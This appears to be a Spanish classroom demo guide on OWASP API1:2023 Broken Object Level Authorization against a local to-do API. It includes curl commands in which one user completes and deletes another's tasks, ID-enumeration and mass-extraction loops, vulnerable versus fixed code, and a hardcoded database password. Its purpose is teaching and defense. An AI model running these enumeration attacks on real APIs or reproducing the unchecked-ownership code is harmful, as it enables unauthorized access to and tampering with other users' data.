# üö® OWASP API1:2023 - Autorizaci√≥n Rota a Nivel de Objeto (BOLA) 
## Gu√≠a de Demostraci√≥n de Vulnerabilidad

> **Presentador:** Fernando  
> **Tema:** Seguridad de APIs - Vulnerabilidad BOLA y Mitigaci√≥n  
> **Audiencia:** Presentaci√≥n en Clase  

---

## üéØ **Resumen de la Demo**

Esta demostraci√≥n muestra:
1. **Versi√≥n Vulnerable** - C√≥mo funcionan los ataques BOLA en la pr√°ctica
2. **Versi√≥n Segura** - C√≥mo la autorizaci√≥n adecuada previene el ataque
3. **Impacto Real** - Por qu√© esta vulnerabilidad es cr√≠tica

---

## üìã **Prerrequisitos y Configuraci√≥n**

### Antes de Iniciar la Demo:
```bash
# Asegurar que Docker est√© ejecut√°ndose
sudo docker compose down
sudo docker compose up -d

# Verificar que los servicios est√©n corriendo
sudo docker compose ps
```

### Entorno de Demo:
- **URL Base API:** `http://localhost:3000`
- **Base de Datos:** SQL Server (ToDoDB)
- **Herramientas:** curl, Docker, Git
- **Dos Ramas:** `main` (segura) vs `demo-vulnerable-bola` (vulnerable)

---

## üî¥ **PARTE 1: DEMOSTRACI√ìN DE LA VULNERABILIDAD**

### Paso 1: Cambiar a la Rama Vulnerable
```bash
git checkout demo-vulnerable-bola
```

### Paso 2: Desplegar Versi√≥n Vulnerable
```bash
# Instalar procedimientos almacenados vulnerables
sudo docker cp database-scripts/SP_Completar_Tarea_Vulnerable.sql todo-sqlserver:/tmp/
sudo docker cp database-scripts/SP_Borrar_Tarea_Vulnerable.sql todo-sqlserver:/tmp/

sudo docker exec -it todo-sqlserver /opt/mssql-tools18/bin/sqlcmd -C -S localhost -U sa -P 'TodoApp2024!' -i /tmp/SP_Completar_Tarea_Vulnerable.sql

sudo docker exec -it todo-sqlserver /opt/mssql-tools18/bin/sqlcmd -C -S localhost -U sa -P 'TodoApp2024!' -i /tmp/SP_Borrar_Tarea_Vulnerable.sql

# Reiniciar API con c√≥digo vulnerable
sudo docker compose restart api
```

### Paso 3: Crear Usuarios y Tareas de Prueba

#### Crear Usuario 1 (Alice):
```bash
curl -X POST http://localhost:3000/api/usuarios \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Alice",
    "correo": "alice@demo.com",
    "password": "Password123!"
  }'
```

#### Crear Usuario 2 (Bob):
```bash
curl -X POST http://localhost:3000/api/usuarios \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Bob", 
    "correo": "bob@demo.com",
    "password": "Password123!"
  }'
```

#### Iniciar Sesi√≥n como Alice:
```bash
ALICE_TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/login \
  -H "Content-Type: application/json" \
  -d '{"correo": "alice@demo.com", "password": "Password123!"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo "Token de Alice: $ALICE_TOKEN"
```

#### Iniciar Sesi√≥n como Bob:
```bash
BOB_TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/login \
  -H "Content-Type: application/json" \
  -d '{"correo": "bob@demo.com", "password": "Password123!"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo "Token de Bob: $BOB_TOKEN"
```

### Paso 4: Crear Tareas para Cada Usuario

#### Alice crea su tarea:
```bash
curl -X POST http://localhost:3000/api/tareas \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{
    "titulo": "Alice: Completar Reporte del Proyecto",
    "descripcion": "Terminar el an√°lisis trimestral del proyecto"
  }'
```

#### Bob crea su tarea:
```bash
curl -X POST http://localhost:3000/api/tareas \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "titulo": "Bob: Revisar Pol√≠ticas de Seguridad", 
    "descripcion": "Revisar y actualizar las pol√≠ticas de seguridad de la empresa"
  }'
```

### Paso 5: Ver Tareas para Obtener los IDs

#### Alice ve sus tareas:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | jq '.'
```

#### Bob ve sus tareas:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $BOB_TOKEN" \
  | jq '.'
```

> **üìù ¬°Anota los IDs de las tareas!** Los necesitar√°s para el ataque.

### Paso 6: üö® ¬°DEMOSTRAR EL ATAQUE BOLA!

#### Escenario de Ataque: Bob intenta completar la tarea de Alice

```bash
# Bob intenta completar la tarea de Alice (ID de Tarea 1)
curl -X PUT http://localhost:3000/api/tareas/1/completar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "¬°HACKEADO! Bob complet√≥ la tarea de Alice - ¬°vulnerabilidad BOLA!"
  }'
```

**‚ö†Ô∏è Resultado Esperado (Vulnerable):** `{"mensaje":"Tarea completada exitosamente"}`

#### Escenario de Ataque: Bob intenta eliminar la tarea de Alice

```bash
# Bob intenta eliminar la tarea restante de Alice (ID de Tarea X)
curl -X DELETE http://localhost:3000/api/tareas/2/borrar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "¬°HACKEADO! Bob elimin√≥ la tarea de Alice - ¬°vulnerabilidad BOLA!"
  }'
```

**‚ö†Ô∏è Resultado Esperado (Vulnerable):** `{"mensaje":"Tarea borrada exitosamente"}`

### Paso 7: Verificar que el Ataque Funcion√≥

```bash
# Alice revisa sus tareas - ¬°deber√≠an estar modificadas por Bob!
curl -X GET "http://localhost:3000/api/tareas?filter=all_including_deleted" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  | jq '.'
```

**üéØ Punto de Demo:** ¬°Las tareas de Alice fueron modificadas por Bob! Esta es la vulnerabilidad BOLA en acci√≥n.

---

## üü¢ **PARTE 2: IMPLEMENTACI√ìN SEGURA**

### Paso 8: Cambiar a la Rama Segura
```bash
git checkout main
```

### Paso 9: Desplegar Versi√≥n Segura
```bash
# Reiniciar API con c√≥digo seguro
sudo docker compose restart api

# Los procedimientos almacenados seguros ya est√°n desplegados
```

### Paso 10: Probar con el Mismo Ataque (Deber√≠a Fallar)

#### Intentar el mismo ataque - Bob completando la tarea de Alice:
```bash
curl -X PUT http://localhost:3000/api/tareas/1/completar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "¬°Este ataque deber√≠a fallar ahora!"
  }'
```

**‚úÖ Resultado Esperado (Seguro):** `{"error":"Tarea no encontrada o no pertenece al usuario"}`

#### Intentar ataque de eliminaci√≥n:
```bash
curl -X DELETE http://localhost:3000/api/tareas/2/borrar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -d '{
    "comentario": "¬°Este ataque tambi√©n deber√≠a fallar!"
  }'
```

**‚úÖ Resultado Esperado (Seguro):** `{"error":"Tarea no encontrada o no pertenece al usuario"}`

---

## üìä **PUNTOS CLAVE PARA DISCUTIR EN CLASE**

### ¬øQu√© es BOLA?
- **Definici√≥n:** Cuando las APIs fallan en validar que los usuarios solo pueden acceder a sus propios recursos
- **Ranking OWASP:** Riesgo de Seguridad API #1 en 2023
- **Nombres Alternativos:** IDOR (Referencia Directa a Objeto Insegura)

### La Vulnerabilidad en el C√≥digo

#### **C√≥digo Vulnerable:**
```javascript
// ‚ùå VULNERABLE: Sin validaci√≥n de usuario
const { id } = req.params;
// Falta: const { usuario } = req;

await pool.request()
    .input("tareaId", sql.INT, parseInt(id))
    // Falta: .input("usuarioId", sql.INT, usuario.id)
    .execute("SP_Completar_Tarea_Vulnerable");
```

#### **C√≥digo Seguro:**
```javascript
// ‚úÖ SEGURO: Validaci√≥n adecuada de usuario
const { id } = req.params;
const { usuario } = req;        // Extraer usuario autenticado

await pool.request()
    .input("tareaId", sql.INT, parseInt(id))
    .input("usuarioId", sql.INT, usuario.id)  // Validar propiedad
    .execute("SP_Completar_Tarea");
```

### Protecci√≥n a Nivel de Base de Datos

#### **SQL Vulnerable:**
```sql
-- ‚ùå VULNERABLE: Sin verificaci√≥n de propiedad
UPDATE Gestion.Tarea 
SET completada = 1
WHERE id = @tareaId;  -- ¬°Cualquier usuario puede modificar cualquier tarea!
```

#### **SQL Seguro:**
```sql
-- ‚úÖ SEGURO: Validaci√≥n de propiedad
UPDATE Gestion.Tarea 
SET completada = 1
WHERE id = @tareaId 
AND usuarioId = @usuarioId;  -- Solo el propietario puede modificar
```

### Impacto en el Mundo Real
- **Violaciones de Datos:** Usuarios accediendo a informaci√≥n sensible de otros
- **Manipulaci√≥n de Datos:** Modificaci√≥n no autorizada de recursos
- **Violaciones de Privacidad:** Exposici√≥n de datos personales
- **Elusi√≥n de L√≥gica de Negocio:** Eludir flujos de trabajo de la aplicaci√≥n

---

## üîß **ESTRATEGIAS DE PREVENCI√ìN BOLA**

### 1. **Implementar Autorizaci√≥n Adecuada**
- Siempre validar la propiedad del recurso
- Usar el contexto del usuario autenticado en cada solicitud
- Nunca confiar en identificadores de recursos proporcionados por el cliente

### 2. **Seguridad a Nivel de Base de Datos**
- Incluir validaci√≥n de usuario/propietario en todas las consultas
- Usar procedimientos almacenados parametrizados
- Implementar seguridad a nivel de fila donde sea posible

### 3. **Defensa en Profundidad**
```
üõ°Ô∏è Capa 1: Autenticaci√≥n (¬øQui√©n eres?)
üõ°Ô∏è Capa 2: Autorizaci√≥n (¬øQu√© puedes acceder?)  
üõ°Ô∏è Capa 3: Validaci√≥n de Recursos (¬øEres propietario de esto?)
üõ°Ô∏è Capa 4: Restricciones de Base de Datos (Hacer cumplir a nivel de BD)
```

### 4. **Pruebas y Validaci√≥n**
- Probar con m√∫ltiples cuentas de usuario
- Escaneo automatizado de seguridad
- Pruebas manuales de penetraci√≥n
- Revisiones de c√≥digo enfocadas en autorizaci√≥n

---

## üéì **LIMPIEZA DE LA DEMO**

```bash
# Regresar a la rama principal
git checkout main

# Reiniciar datos de demo si es necesario
sudo docker compose down
sudo docker compose up -d

echo "¬°Demo completada exitosamente!"
```

---

## üí° **ESCENARIOS DE ATAQUE ADICIONALES** (Contenido Bonus)

### Ataque de Enumeraci√≥n de ID:
```bash
# El atacante prueba IDs secuenciales
for i in {1..10}; do
  curl -X PUT http://localhost:3000/api/tareas/$i/completar \
    -H "Authorization: Bearer $BOB_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"comentario":"Ataque de enumeraci√≥n"}' 2>/dev/null | grep "exitosamente" && echo "Tarea $i vulnerable"
done
```

### Extracci√≥n Masiva de Datos:
```bash
# Si los endpoints GET tambi√©n fueran vulnerables (no en esta demo)
for i in {1..100}; do
  curl -X GET http://localhost:3000/api/tareas/$i \
    -H "Authorization: Bearer $BOB_TOKEN" 2>/dev/null | jq '.titulo' 2>/dev/null
done
```

---

## ‚úÖ **LISTA DE VERIFICACI√ìN DE LA DEMO**

- [ ] Rama vulnerable desplegada
- [ ] Usuarios de prueba creados (Alice y Bob)
- [ ] Tareas creadas para ambos usuarios
- [ ] Ataque BOLA demostrado exitosamente
- [ ] Cambiado a rama segura
- [ ] Ataque bloqueado en versi√≥n segura
- [ ] Detalles t√©cnicos explicados
- [ ] Estrategias de prevenci√≥n discutidas
- [ ] Preguntas de la audiencia respondidas

---

**üéØ Mensaje Clave:** BOLA es la vulnerabilidad de seguridad API #1, pero es completamente prevenible con verificaciones de autorizaci√≥n adecuadas en cada capa de tu aplicaci√≥n.
